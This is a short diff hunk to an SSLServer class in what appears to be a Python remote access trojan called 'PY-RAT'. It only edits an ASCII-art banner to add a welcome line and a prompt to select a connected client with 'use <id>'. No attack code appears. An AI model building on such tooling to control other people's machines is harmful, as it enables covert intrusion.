@@ -67,8 +67,10 @@ class SSLServer:
         :::   :::    ::: :::     :::::::::  :::   :::     :::
         :::::::::     :::::: ::: :::::::    :::::::::     :::
         :::              :::     :::  :::   :::   :::     :::
-        :::              :::     :::   :::  :::   :::     :::
-
+        :::              :::     :::   :::  :::   :::     :::        
+        WELCOME TO PY-RAT!
+        TO START WAIT FOR A CLIENT TO CONNECT AND ENTER:
+        use <id>
         """
         )
 
